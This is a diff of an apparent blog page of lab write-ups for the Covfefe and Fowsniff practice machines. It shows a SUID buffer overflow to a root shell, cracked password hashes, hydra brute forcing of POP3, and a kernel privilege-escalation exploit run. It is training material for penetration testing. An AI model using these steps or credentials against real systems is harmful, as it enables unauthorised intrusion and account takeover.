@@ -513,29 +513,24 @@ simon@covfefe:~$</p>
   <li>
     <p>System Enumeration: running <code class="highlighter-rouge">linpeas</code> found that we have access to /root directory but we can’t read the flag (we are not the root), but we can see read_message.c and also found read_message binary with SUID, so since we can read the source code it may mean that we can run for buffer overflow against it to gain root.</p>
   </li>
-  <li>
-    <p>Buffer Overflow: We need first to read the code to understand what dose it do, we can transfer it to our local machine and use gdb, in our case by looking the code it’s self we can un derstand how to break it:</p>
+  <li>Buffer Overflow: We need first to read the code to understand what dose it do, we can transfer it to our local machine and use gdb, in our case by looking the code it’s self we can un derstand how to break it:
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main(int argc, char *argv[]) {
 char program[] = "/usr/local/sbin/message";
 char buf[20];
 char authorized[] = "Simon";
 </code></pre></div>    </div>
-  </li>
-</ol>
-
-<p>In that lines there is a <code class="highlighter-rouge">buf</code> variable which is in the size of 20 chars, the authorized is Simon and later it used to check the value from the user input if it match.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("What is your name?\n");
+    <p>In that lines there is a <code class="highlighter-rouge">buf</code> variable which is in the size of 20 chars, the authorized is Simon and later it used to check the value from the user input if it match.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("What is your name?\n");
 gets(buf);
 since gets have no bouderies we can exploit it
 if (!strncmp(authorized, buf, 5)) {
 printf("Hello %s! Here is your message:\n\n", buf);
 // This is safe as the user can't mess with the binary location:
 execve(program, NULL, NULL);
-</code></pre></div></div>
-<p>The <code class="highlighter-rouge">execve</code> is used to run binary file, which in our case should be <code class="highlighter-rouge">/usr/local/sbin/message</code>, since the matching on that code used for the five first chars we can overflow the <code class="highlighter-rouge">buf</code> to
+</code></pre></div>    </div>
+    <p>The <code class="highlighter-rouge">execve</code> is used to run binary file, which in our case should be <code class="highlighter-rouge">/usr/local/sbin/message</code>, since the matching on that code used for the five first chars we can overflow the <code class="highlighter-rouge">buf</code> to
 contain more then 20 chars and after that overwrite the program value with another binary value, in my case <code class="highlighter-rouge">/bin/sh</code>.</p>
-
-<ol>
+  </li>
   <li>Privalge Escalation: running the program with the values more then 20 chars and insert /bin/sh to gain shell as root:
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>simon@covfefe:~$ read_message
 What is your name?
@@ -554,17 +549,12 @@ uid=1000(simon) gid=1000(simon) euid=0(root) groups=1000(simon),24(cdrom),25(flo
   <li>Enumeration: running full port scan with <code class="highlighter-rouge">rustscan</code> found that only 22,80,110,143 are open, so run <code class="highlighter-rouge">nmap</code> and found that none of the port look like interesting, so go against the web with <code class="highlighter-rouge">webenum</code> found nothing but on the index.html page found the following which give clue what to do next:
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.
 </code></pre></div>    </div>
-  </li>
-</ol>
-
-<p>This lead us to run google search for <code class="highlighter-rouge">Fowsniff</code> since it tell us that this system are exposure data, so with just a luck, you will find pastbin page that contain the following two links:</p>
-<ul>
-  <li>https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt</li>
-  <li>https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX</li>
-</ul>
-
-<p>By going to this link we find users and passwords:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+    <p>This lead us to run google search for <code class="highlighter-rouge">Fowsniff</code> since it tell us that this system are exposure data, so with just a luck, you will find pastbin page that contain the following two links:</p>
+    <ul>
+      <li>https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt</li>
+      <li>https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX
+By going to this link we find users and passwords:
+        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
 mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
 tegel@fowsniff:1dc352435fecca338acfd4be10984009
 baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
@@ -573,86 +563,84 @@ stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
 mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
 parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
 sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
-</code></pre></div></div>
-
-<ol>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
   <li>Hash Cracking: now after we have the hashs, we can use john or other tool to crack them all, you can also use crackstation.
-```
-└─$ john hashs.txt –wordlist=./pass.txt –format=Ra
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ john hashs.txt --wordlist=./pass.txt --format=Ra
 w-MD5
 Using default input encoding: UTF-8
 Loaded 9 password hashes with no different salts (Ra
 w-MD5 [MD5 128/128 AVX 4x3])
 Warning: no OpenMP support for this hash type, consi
-der –fork=4
-Press ‘q’ or Ctrl-C to abort, almost any other key f
+der --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key f
 or status
-mailcall         (mauer@fowsniff)   <br />
-bilbo101         (mustikka@fowsniff)   <br />
-apples01         (tegel@fowsniff)   <br />
-skyler22         (baksteen@fowsniff)   <br />
-scoobydoo2       (seina@fowsniff)   <br />
-carp4ever        (mursten@fowsniff)   <br />
-orlando12        (parede@fowsniff)   <br />
-07011972         (sciana@fowsniff)   <br />
+mailcall         (mauer@fowsniff)     
+bilbo101         (mustikka@fowsniff)     
+apples01         (tegel@fowsniff)     
+skyler22         (baksteen@fowsniff)     
+scoobydoo2       (seina@fowsniff)     
+carp4ever        (mursten@fowsniff)     
+orlando12        (parede@fowsniff)     
+07011972         (sciana@fowsniff)     
 8g 0:00:00:00 DONE (2022-10-18 05:55) 800.0g/s 1700p
 /s 1700c/s 15300C/s mailcall..07011972
 Warning: passwords printed above might not be all th
 ose cracked
-Use the “–show –format=Raw-MD5” options to display
+Use the "--show --format=Raw-MD5" options to display
  all of the cracked passwords reliably
-Session completed.</li>
-</ol>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-4. Brute Forcing: sicne we have the users and password, we can use it against the ssh, or pop3 (port 110) or IMAP (port 143), in my case I found the way over port 110:
-</code></pre></div></div>
-<p>└─$ hydra -L users.txt -P ./pass.txt 192.168.80.18 pop3<br />
+Session completed.
+</code></pre></div>    </div>
+  </li>
+  <li>Brute Forcing: sicne we have the users and password, we can use it against the ssh, or pop3 (port 110) or IMAP (port 143), in my case I found the way over port 110:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ hydra -L users.txt -P ./pass.txt 192.168.80.18 pop3  
 output:
-[110][pop3] host: 192.168.80.18   login: seina   password: scoobydoo2</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-5. Initiation: login via pop3 using the user and password found, we can see that we on that user email box, so run several pop3 commands like `LIST`, `RETR 1`, found line that say what is the password for ssh:
-</code></pre></div></div>
-<p>The temporary password for SSH is “S1ck3nBluff+secureshell”</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying that password with seina user give us nothing, so run the brute force step again with the list of users we have with that password and found that ssh the correct user is `baksteen`, so run ssh with that user and password:
-</code></pre></div></div>
-<p>└─$ ssh baksteen@192.168.80.18 -p 22       <br />
+[110][pop3] host: 192.168.80.18   login: seina   password: scoobydoo2
+</code></pre></div>    </div>
+  </li>
+  <li>Initiation: login via pop3 using the user and password found, we can see that we on that user email box, so run several pop3 commands like <code class="highlighter-rouge">LIST</code>, <code class="highlighter-rouge">RETR 1</code>, found line that say what is the password for ssh:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The temporary password for SSH is "S1ck3nBluff+secureshell"
+</code></pre></div>    </div>
+    <p>Trying that password with seina user give us nothing, so run the brute force step again with the list of users we have with that password and found that ssh the correct user is <code class="highlighter-rouge">baksteen</code>, so run ssh with that user and password:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ssh baksteen@192.168.80.18 -p 22         
 output:
-baksteen@fowsniff:~$</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-6. System Enumeration: running several command for enumerate the system found the following linux version:
-</code></pre></div></div>
-<p>baksteen@fowsniff:~$ uname -a
+baksteen@fowsniff:~$
+</code></pre></div>    </div>
+  </li>
+  <li>System Enumeration: running several command for enumerate the system found the following linux version:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>baksteen@fowsniff:~$ uname -a
 Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 U
-TC 2018 x86_64 x86_64 x86_64 GNU/Linux</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-By running `searchsploit` we can find exploit for that version:
-</code></pre></div></div>
-<p>└─$ searchsploit 4.4.0 linux kernel 116
-———————————————————————-
-———————— ———————————
- Exploit Title                                                      <br />
-                        |  Path
-———————————————————————-
-———————— ———————————
-Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation          <br />
-                        | linux/local/41886.c
+TC 2018 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre></div>    </div>
+    <p>By running <code class="highlighter-rouge">searchsploit</code> we can find exploit for that version:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ searchsploit 4.4.0 linux kernel 116
+<span class="gd">----------------------------------------------------------------------
+------------------------ ---------------------------------
+</span> Exploit Title                                                        
+                     |  Path
+<span class="gd">----------------------------------------------------------------------
+------------------------ ---------------------------------
+</span>Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation            
+                     | linux/local/41886.c
 Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
-                        | linux/local/44298.c
-———————————————————————-
-———————— ———————————
-Shellcodes: No Results</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-7. Privilege Escalation: transfer the exploit to the target, run gcc to compile it and execute it give us root shell:
-</code></pre></div></div>
-<p>baksteen@fowsniff:~$ ./exploit
+                     | linux/local/44298.c
+<span class="gd">----------------------------------------------------------------------
+------------------------ ---------------------------------
+</span>Shellcodes: No Results
+</code></pre></div>    </div>
+  </li>
+  <li>Privilege Escalation: transfer the exploit to the target, run gcc to compile it and execute it give us root shell:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>baksteen@fowsniff:~$ ./exploit
 task_struct = ffff88003c761c00
 uidptr = ffff88003aa77a84
 spawning root shell
 root@fowsniff:~# id
 uid=0(root) gid=0(root) groups=0(root),100(users),1001(baksteen)
-```</p>
+</code></pre></div>    </div>
+  </li>
+</ol>
 
 <h3 id="geisha">Geisha</h3>
 
